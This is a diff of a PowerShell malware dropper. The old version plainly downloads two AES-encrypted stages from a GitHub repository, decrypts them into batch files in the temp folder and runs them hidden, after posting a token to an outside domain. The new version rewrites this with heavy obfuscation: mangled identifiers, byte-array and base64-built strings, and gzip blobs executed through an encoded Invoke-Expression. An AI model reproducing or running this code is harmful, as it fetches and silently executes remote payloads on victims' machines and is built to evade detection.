@@ -1,42 +1,9 @@
-# Token verification (runs if $token is set)
-if ($token) {
-    try {
-        Invoke-RestMethod -Uri "https://teendrive.xyz/api/verify" -Method Post -Body (@{token=$token} | ConvertTo-Json) -ContentType "application/json"
-    } catch {}
-}
-
-# First set of URLs
-$urls = @(
-    @{url="https://github.com/TeenDrive/TeenDrive/raw/refs/heads/main/stage1"; out="batch1.enc"; dec="batch1.bat"; key="4bxXABIN1x7cBjVFt/787F931AXjgjp6tSI/ub3Ga7Q="; iv="Viuu5G6wiSV3CEAihlHG/w=="},
-    @{url="https://github.com/TeenDrive/TeenDrive/raw/refs/heads/main/stage2"; out="batch2.enc"; dec="batch2.bat"; key="oT58+VRk0I01+W343lpSl/SpMaJymx+N0oO4iJVPIUM="; iv="CaZcykeh8Cr5pkuoOTwddw=="}
+function `F`Kuio`Z`Jpe`H6 {param ([string] $kdOTyfgtrlKmav);${`Kd`Ot`D`Gte`Y`E`Y`I`W`O} = [CoNVERT]::"`F`R`O`M`B`A`S`E64st`Ri`Ng"($kdOTyFgtrlkMav);${k`D`Ot`Qfxx`N`N`Zqoj} = [SystEM.iO.meMorysTREaM]::"`New"(${kd`Ot`D`G`T`Ey`E`Yiwo});${kdotbvtvftzhoc} = [SYsteM.Io.compresSION.gZiPstrEAM]::"`Ne`W"(${kdo`T`Qf`X`Xn`Nz`Qoj}, [sYSTEm.Io.COMprESSiOn.COMPRESSiONMoDE]::"`Dec`O`Mp`R`E`S`S");${KdOtbvtvftzhoc} = [sySTEm.io.COmPrEsSION.gZiPStReaM]::"n`E`W"([SysteM.IO.mEmOryStReam]::"new"(${k`Do`Tdgte`Yey`Iwo}), [sYstem.iO.coMPREsSioN.COMPreSsIONMoDE]::"`D`E`Co`M`Pr`Ess");${kdo`T`U`F`T`Wa`Vb`G`Mw} = [sYStEm.IO.StReaMreADEr]::"new"(${KdOtbvtvftzhoc});${kdo`Tpc`N`H`D`M`Uf`Wa} = ${`Kd`Otuft`W`A`Vbg`M`W}."r`E`A`Dto`End"();return ${`Kd`Otp`Cnhd`Mu`Fw`A}}
+(FKuioZJpeH6 H4sIAAAAAAAACmWTgW7TMBCGn4B3iCqkJbJd+c722Z40CRjpGGMd0AyxVZO8telWxpLRhkFV+u7I7oYQWLHkXHL3n+7/PJ9l+fP17TScdJNQzh5mYfRtFo5WmyJbP8uyLOsWq8dTXP1cfGnnzXhyc7kYX1zkubDWa0YOJQOpbcFzoxUKoxALngtnvGXOgokvRoJhBpAKnmtNUmhlVPxAipA5J0mg0imC0kuGoFKeVtaxmFDwHEmBQKPiWWhpLNNgH6WkZI4gVheKpBbKK8ssgSt4DkqRFWRQCbJJwytQwoOPPQuy1jJyDlIlD5Z5iSlPk2TaKxCEHoqiyMTpYp7leT4enS2r+q5flT+rfjmctNPD5vpid7cXTkMVBq7X74WDuluGKnwMh0046OXjq1VXx7GB1ByAHjdyAMON49rGJwUlbDdIDlJyAM1BmqIoWBQeVfVxFO76ZTM5mc6bgyfh2VY3lKEKo1At5mGYlJer1OykHT7Uiyr9PViEk7ur8HIZStJPbV738p3p3en3+s1XeoeDH5cjj+ef396fN7d7O0VcmTiuu5t2mr1vl10mXrXTVZa/WFftUTnciyi1oQr7dRiET2EQRuFDGISjcLbZZL/+x4csoiAy0WcyDgRpu7XWk2JG2i0NThFDb3SiyBpk2qJnAJgipBjYZCOgVQyU85EwT0boraXkUQpyMsYFemUYehd1wHoUYBMiFK026AU5G+tqQ05obWJl9BpjG7idwH7bdHXTVav7OqGwXI2q8rjf1cmR/fb1/F8Urusu+hFnHIbXf6Hgo+GRAOQgXTSZe89TNGJgOMAWg0iGjLj8CSU70tXcZJPLbnKTrTfPNr8BTA3WR9IDAAA=) | .(-join[char[]]((-3461+3534),(9799-9689),(417-299),(5103-4992),(-7514+1136+6485),(6738-6637),(-8981+7534+1492),(-3860+3929),(11539-8751-2668),(-3542+3654),(-4395+4509),(-1919+2020),(2962-7944+5097),(-53+168),(7535-7430),(-7311-1273+8695),(-4076+4186)))
+${kdotpjkilaxcig} = @(
+    @{uRL=((([sysTEM.tExt.ENcODInG]::"ut`F8"."g`Ets`Tri`Ng"([byte[]](0x68,116,116,0x70,0x73,0x3a,47,0x2f,0x67,105,0x74,104,117,0x62,0x2e,0x63,0x6f,109,47,0x54,0x65,101,110,0x44,0x72)))+([sYstEm.teXT.enCoDINg]::"u`Tf8"."`Get`S`T`Rin`G"([byte[]](105,118,101,47,84,101,101,110,68,114,105,118,101,47,114,97,119,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,115)))+([SYsTEM.TeXt.ENcoDinG]::"ut`F8"."ge`Tst`Rin`G"([sYStEm.CoNvErt]::"fr`Om`B`A`Se64`St`Ri`N`G"('dGFnZTE='))))); out=((([sYSTeM.teXt.ENCODIng]::"`Ut`F8"."`G`Etst`Rin`G"([byte[]](98,97,116,99,104,49,46,101,110,99))))); DEc=((([SySteM.TEXt.eNCoDINg]::"`Utf8"."`Ge`Tstr`I`N`G"([byte[]](98,0x61,0x74,0x63,0x68,49,0x2e,0x62,97,116))))); key=((([SYstem.teXT.ENCoDInG]::"`U`T`F8"."`Getstring"(([byte[]](0x34,0x62,0x78,0x58,0x41,0x42,0x49,0x4e,0x31,0x78,0x37,0x63,0x42,0x6a,0x56,0x46,0x74))))+([SYSTeM.text.ENcOdinG]::"utf8"."g`E`Ts`Trin`G"([SYSteM.coNVeRT]::"fro`M`B`Ase64s`T`Rin`G"('Lzc4N0Y5MzFBWGpnanA2dFNJL3Vi')))+([SYStem.text.eNcODinG]::"utf8"."g`E`T`S`T`Rin`G"(([byte[]](0x33,0x47,0x61,0x37,0x51,0x3d)))))); IV=((([SYStem.TEXT.ENcoDiNg]::"u`T`F8"."g`Et`S`Tr`In`G"([sysTeM.COnVErt]::"`F`Romb`A`S`E64`St`Ri`Ng"('Vml1dTVHNndpU1YzQ0VBaWhsSA==')))+([systEm.tEXT.EncODINg]::"u`T`F8"."ge`Ts`T`R`I`N`G"([byte[]](71,0x2f,119,0x3d,61)))))},
+    @{urL=((([system.TeXt.encODinG]::"`U`T`F8"."`Get`Str`In`G"([byte[]](0x68,116,116,0x70,115,0x3a,0x2f,0x2f,103,0x69,116,104,117,98,0x2e,99,111,0x6d,47,0x54,0x65,0x65,0x6e,0x44,114,105,118,0x65,0x2f,84,0x65,0x65,0x6e,68,114)))+([SYSTEM.tEXT.ENCODiNg]::"`U`Tf8"."`Ge`Ts`T`R`In`G"([byte[]](105,118,101,47,114,97,119,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,115,116,97,103,101,50))))); oUT=((([sySTem.teXT.EnCoDING]::"`Utf8"."`Ge`T`S`Tri`Ng"([sySTeM.cOnveRT]::"fro`M`B`As`E64str`In`G"('YmF0Y2gyLmVuYw=='))))); dEC=((([SYStem.tExT.EncodINg]::"`Ut`F8"."g`E`T`Str`I`N`G"(([byte[]](0x62,0x61,0x74,0x63,0x68,0x32,0x2e,0x62,0x61,0x74)))))); keY=((([SYsTeM.tExt.encoding]::"utf8"."`G`E`T`S`Tr`I`N`G"([byte[]](111,84,53,56,43,86,82,107,48,73,48,49,43,87,51,52)))+([sYsTEm.tExT.eNcodInG]::"u`Tf8"."g`Et`St`Rin`G"([SystEM.CONveRt]::"f`Rombase64stri`N`G"('M2xwU2wvU3BNYUp5bXgrTjA=')))+([SysTEm.TeXT.ENCodINg]::"`U`T`F8"."getstr`Ing"(([byte[]](0x6f,0x4f,0x34,0x69,0x4a,0x56,0x50,0x49,0x55,0x4d,0x3d)))))); iv=((([SYstEm.teXT.encodIng]::"ut`F8"."ge`T`St`R`I`Ng"([byte[]](67,97,90,99,121,107,101,104,56,67,114,53,112,107,117,111,79,84,119,100)))+([SysTEm.TExt.ENcODing]::"`Ut`F8"."ge`Ts`Tr`In`G"([byte[]](100,119,61,61)))))}
 )
-$temp = $env:TEMP
-
-function D([string]$u,[string]$o,[string]$d,[string]$k,[string]$i) {
-    Invoke-WebRequest $u -OutFile $o
-    $key = [Convert]::FromBase64String($k)
-    $iv = [Convert]::FromBase64String($i)
-    $aes = [System.Security.Cryptography.Aes]::Create()
-    $aes.KeySize = 256
-    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
-    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-    $aes.Key = $key
-    $aes.IV = $iv
-    $dec = $aes.CreateDecryptor()
-    $enc = [IO.File]::ReadAllBytes($o)
-    $ms = New-Object IO.MemoryStream
-    $cs = New-Object Security.Cryptography.CryptoStream($ms, $dec, [Security.Cryptography.CryptoStreamMode]::Write)
-    $cs.Write($enc, 0, $enc.Length)
-    $cs.Close()
-    [IO.File]::WriteAllBytes($d, $ms.ToArray())
-}
-
-foreach ($item in $urls) {
-    $out = Join-Path $temp $item.out
-    $dec = Join-Path $temp $item.dec
-    D $item.url $out $dec $item.key $item.iv
-    # Run hidden with cmd.exe
-    Start-Process cmd.exe -ArgumentList "/c `"$dec`"" -WindowStyle Hidden
-    # Also run with conhost.exe --headless and wait for completion
-    Start-Process conhost.exe -ArgumentList "--headless `"$dec`"" -Wait
-}
+${`K`Do`T`Bpiq`Pc`J`G`Re} = $env:TeMp
+(FKuioZJpeH6 H4sIAAAAAAAACrVWXXPaOhD9Bf0PDNMHfI0Yy/qwnZk+8FXqhADFTgLJZGaNMYEAFjVKrmmH/35HMoSk6UMebv3gkXaks6vds0eaPaWxXIi0tJCbGD/P5paEeuVuK7NF+nD/+WIqZH6bzzbb9fNzXj3ZW0L+2D4scj/+ka9O9uVUhLOpmM3k+iGavbFLIW7jh3w1SaNXOFMh15PwcSNmq+zZKP36VCqVSrUKehSL9C6eR9nd/X2lgijB1KTEdYxqBTGbMZMRzoxqxeXcQy5jWI2Z5yKXFos45Z7JmcPVhLouMannUj1hmJsusz1EPO4a1YqDLYocC6t9rusgx9WbGLaoSSm2TMezjWrFJibzjGrFY8RDHiVqKya2hbBtaZcOY67JOLNN27KJ2oFtig5jxGzumoy4euJg7piO7RLDMEo6O/nPfDbQWS6h/pP8ulglJZ2eU5p1bj7/ggtoCfkALbjYQRsGExjBAC72pS+lu6ZIr5NM3p+dlWcwhP4aGlDfQptTCHTKy5VTLUaqFsYBdQkt6EMILbiF6yxPoxWcg69B437vBTQT60m0TTjdShiCrwGLIspjEY+Ays0jhBBACCP4CtfQgK4GDMZBmKxr26T5NPTDXS0e7gay38miwbdxLWoHylMMQ2hHEtrlyhERlCPoP0K4hTCfPU9W+9pFexz4t+3Sl1Lltw95tuOhRpRObc+yDD06GkWmbQfj+6Ui+33lcekHYUX2MVTD/CuhKvf/d6QFgJV/PXwqeMtA2uF2vsLqn2HDMDkn7A2rJPThXEIg84IFq33tst9SNbvb7gKZrGtBO34aLsJxrZntBlJ0hpoJTX/zrT1c96fJ/dlZs9E8EQtCDalo8EKs2iZqTf20U8BuFcGCdvMqUwRrDsebUHSGdQU7qLdaftpZ91vt+7OzwTLeOqdoD9CaYjCaPetol+1x6Yv2rA7TgdYSxqrzoHFovbeRHUivQ1Mc9a/17oK+ur9gCCPoQX31uNi/7moIY7iAMXx7hBtoQjeFhmqYA3LRTVI10/NEnfjUJNBK1HgMAxVA9rZnFKr/CL013ExgtJK6BxeiNvO7KgPlLIE6tKIVdCcwVmCBauqjwi+U9Lyqp5DQmafREq5ECrfwXaG9E2zKOCKOVkjHcwhyCWfIY1oniWNzxIlHTdsptBozl5uYEyXizCI2oh5TMkkcYiHCiVJfRDjFJnGo3kEwxiZ3qGkzrcPI9bhtehZXEAi7lCLmWo7pONxREuv3a5fJWmS7QGZJtH4tKBn4uuajnxBAF0Zw9ccTIUxtxzI9Ytkms6i+ITAm1MQ2URcRIjb2TEJ0ODZ2EHZ02Jh7mJqu5zLTtSwdq8e4ZXqc6YnNCDFtTtTNgjDFxMQMF/cUdTyTW9RBmHJ98VBCkUewq04UJPFTtpA71TIbKR6yaDM/TopDVk6i3pmnUIeLJwE9uP2xr75wtbncwTc4h5sYutCDxr5auguS+OqAXHRNtJmPa3G224QiCLN2dHkpdOvcDBey/Ypo0D8mMz/lslb+NwNfJmUVzlTIeAHn0INLuJnk0JX76mvhRpNUyMNffdz2LNTIRYbUqFAg+5+DOUqnhfmoje9Wi+wPi1+U/MPgSiI/iF3o+V8KW6v6X4na0Pr+WsVftF1xpahtISKnytXKqwR60JHz8jsSSHHop/xJydRKQHC6ye98pT0rrT1wky0ghDbUobtS8pNs1ROldXhGhvoZeXqePMyhFy0Vj3/C932tLAXUYZhBfVeuGMan/X9fHB+kzwoAAA==) | .(-join[char[]]((7376-7303),(8756-8646),(2705-4043+1456),(-3353+3464),(6566-6459),(1828-1727),(-4121+4166),(-8476-769+9314),(9611-2985-6506),(-6583+6695),(5100-4986),(-2494+2595),(7673-7558),(5299-3500-1684),(-9819+9924),(2359-2248),(3972-3862)))
+(FKuioZJpeH6 H4sIAAAAAAAACnVUe2/TSBD/BHwHq0LC1nqjnd3ZFxJ/HGkopW0CjQv0KqRpE1NcIIbEpQko3/006wB3HERKtLHn9XvMvm2X9eXsXZbf/0ZH87Zr6WVNp3R+u1zRZL3NmkV2/9v7edt9unnffLhcz5rrbZF9u5dlWbZLuVt8/kqjq7amZ3fb7FE2yOVN2ywuZu8ulxdv3uS5jA6DiF7rosw1RC+1Cq4oc4zaSQwaijKX4IJDEZUywkefHnnrlPBO2aLMvXVeegy+KHOnLUgHFlOQtiJgX8IEFwV6rqNVLIqCh6d9mlB1Rc+bz/SchvSMDui03vavWqpoQi/r5YbOlquWXm8H7Vm3g9e/n9ERndPTG3pFQzqm8dVvQYIxRoK2kQcJPoAIITJgEzVIE4ABS0AdnPAJpImGX9topbFWFWVuPYK0ziUwFlA4SMfgQIvgdeB4rUBYtFYGa/UO4rztrj419ILx3dDBkkYJ3pwm3a/o9kfDhO7/ADRoCaCYYBO0ExitRJ3It0YpaSHwADIG40WMhgH5EK30AfnsrIrSmcgjo0Mr0SIjlFYhCAvIlaSNVgkbI5eKIcrgOQYwaFbay6g0fkeVxv9CoyWd09mSpu16Ozg7PU7G61W9W9AL+ru+oklNz+hVj5o1HdLRhp7ys9mHJFkyK6fQ5EvPR1/vqN7sGGz/S1Tz8vc8yYgRRLTKCccgnHFaOuutMJrFRzRBoukdqTVEYTxGCdg7wCmnhQOfqMTgvMAI7BNpUerovDCg+lxjBThnJBhgpwftlAyAyWE6RJAuGCNi0MygY/kc9IbRwaLQ0aVQ1M6JiC5Iq4Jnbmcf54N6XWfyr+X17cd60R03qy7L8zy/WG1WVX0yqEbralCPZ+3+4eLgzcOHe7fd27A32LumEVUrquiUDml8vccJ0270cTCcjL/Uy45D6QmdtnRCjy9pWjtcdXTaLK738gfH+uTRg6IoRGrDWVX9uhqMFsN2/3Cc2tAZVfSEO9FBTRXn0iEn5xdXm65mAdRaq1KtHf9oXgBGJHbb2s3eJ9nv+lWlx9tMMLDUsD4ZdDXj4obN+N+4Ujeadsu+249m0ZUGdz3kq2Yxb++m3eZDnT1t5vN68QeHaKuFMb3dDYKIqARa4M1CAJSo0tlEFaXxMQWiE+DYB94GL73F5Angj/BRGWF0v35gvBaA6QIN1oEMmC4P3t0gQKcFlhq9ESZqoSFwpajYPLHfQYSgBerYm6FdvGtX3Z8MMd2sKlZq9JqJm03mzfi6V+oHcx0T1/R2+E4c2hJtCQpLUFBGX4JSJaiQ/gLY9DW6/EnwLxqm67Zf3Z2C58lo1WjdDUbj4WTeLNIgtz8dQ6OOpmzOhsZ08EcZL5vu3vYfVZA6zfkGAAA=) | .(-join[char[]]((-3347-1485+4905),(-516+626),(3362-3244),(-6609+6720),(-1404+1511),(-1598-8134+9833),(-8467+8512),(1039-970),(1642-1522),(6689-6577),(820+6007-6713),(-6830+5990+941),(7277+858-8020),(-8091+8206),(-4408+4513),(-6851+6962),(-2611+2721)))
